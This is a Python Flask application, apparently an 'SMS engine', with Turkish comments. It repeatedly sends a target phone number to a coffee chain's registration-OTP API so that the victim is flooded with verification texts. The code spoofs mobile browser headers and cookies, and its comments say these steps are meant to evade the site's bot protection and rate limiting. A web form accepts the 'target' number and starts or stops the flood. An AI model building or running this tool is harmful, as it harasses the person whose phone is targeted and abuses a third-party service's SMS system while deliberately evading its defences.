import os, requests, time, threading
from flask import Flask, render_template_string, request, redirect, url_for

app = Flask(__name__)

# --- HAFIZA ---
state = {
    "phone": "",
    "logs": [],
    "is_running": False
}

def write_log(msg):
    tm = time.strftime('%H:%M:%S')
    state["logs"].insert(0, f"[{tm}] {msg}")
    if len(state["logs"]) > 15: state["logs"].pop()
    print(f">>> {tm} - {msg}", flush=True)

# --- ANTI-302 SMS DÖNGÜSÜ ---
def sms_worker():
    # Session kullanarak çerezleri (cookies) hafızada tutuyoruz
    session = requests.Session()
    
    while True:
        if state["is_running"] and state["phone"]:
            # Önce ana sayfaya bir 'GET' atıp çerez alıyoruz (İnsansı hareket 1)
            try:
                session.get("https://www.kahvedunyasi.com/kayit", timeout=5)
            except: pass

            url = "https://www.kahvedunyasi.com/api/v1/auth/register-otp"
            payload = {"mobile_number": state["phone"], "country_code": "90"}
            
            # En güncel ve eksiksiz Header seti (İnsansı hareket 2)
            headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
                "Origin": "https://www.kahvedunyasi.com",
                "Referer": "https://www.kahvedunyasi.com/kayit",
                "X-Requested-With": "XMLHttpRequest",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin"
            }

            try:
                # 302 yönlendirmesini takip et ama logla
                res = session.post(url, json=payload, headers=headers, timeout=10)
                
                if res.status_code in [200, 201]:
                    write_log(f"Başarılı ✅ ({state['phone']})")
                elif res.status_code == 302:
                    write_log("Hata: 302 (Bot Koruması) 🛡️")
                elif res.status_code == 429:
                    write_log("Hata: 429 (Çok Hızlı!) ⏳")
                else:
                    write_log(f"Hata: {res.status_code}")
            except Exception as e:
                write_log("Bağlantı Kesildi ⚠️")
        
        # 302 almamak için süreyi çok zorlama, 120-150 sn idealdir
        time.sleep(125)

threading.Thread(target=sms_worker, daemon=True).start()

# --- WEB UI ---
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        action = request.form.get('action')
        if action == "start":
            phone = request.form.get('phone', '').strip()
            if len(phone) == 10:
                state["phone"] = phone
                state["is_running"] = True
                write_log(f"Hedef Hazır: {phone}")
        else:
            state["is_running"] = False
            write_log("Sistem Durdu.")
        return redirect(url_for('index'))

    html = """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SMS PRO v5</title>
        <style>
            body { font-family: 'Inter', sans-serif; background: #020617; color: #f8fafc; display: flex; justify-content: center; padding-top: 40px; }
            .card { background: #0f172a; padding: 25px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); width: 350px; border: 1px solid #1e293b; }
            h2 { color: #38bdf8; font-size: 1.5rem; margin-bottom: 20px; letter-spacing: -1px; }
            input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #334155; background: #020617; color: #22c55e; border-radius: 12px; font-size: 18px; text-align: center; outline: none; font-family: monospace; }
            .btn-group { display: flex; gap: 10px; }
            button { flex: 1; padding: 14px; border: none; border-radius: 10px; cursor: pointer; font-weight: 800; transition: all 0.2s; text-transform: uppercase; }
            .start { background: #0ea5e9; color: white; }
            .stop { background: #64748b; color: white; }
            button:active { transform: scale(0.95); }
            .log-box { text-align: left; background: #000; color: #4ade80; padding: 15px; border-radius: 12px; font-family: 'JetBrains Mono', monospace; font-size: 11px; height: 180px; overflow-y: auto; margin-top: 20px; border: 1px solid #1e293b; line-height: 1.6; }
            .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; background: {{ '22c55e' if running else 'ef4444' }}; }
        </style>
        <script>setTimeout(() => { if (!document.querySelector('input:focus')) location.reload(); }, 25000);</script>
    </head>
    <body>
        <div class="card">
            <h2>SMS ENGINE <small style="font-size:10px; color:#64748b;">v5</small></h2>
            <div style="font-size: 13px; margin-bottom: 15px; color: #94a3b8;">
                <span class="status-dot"></span> {{ 'SİSTEM ÇALIŞIYOR' if running else 'SİSTEM DURDURULDU' }}
            </div>
            <form method="POST">
                <input type="text" name="phone" placeholder="5XXXXXXXXX" value="{{ phone }}" maxlength="10">
                <div class="btn-group">
                    <button type="submit" name="action" value="start" class="start">BAŞLAT</button>
                    <button type="submit" name="action" value="stop" class="stop">DURDUR</button>
                </div>
            </form>
            <div class="log-box">
                {% for log in logs %}<div><span style="color:#334155;">></span> {{ log }}</div>{% endfor %}
            </div>
        </div>
    </body>
    </html>
    """
    return render_template_string(html, phone=state["phone"], logs=state["logs"], running=state["is_running"])

if __name__ == "__main__":
    # Render PORT ayarı
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
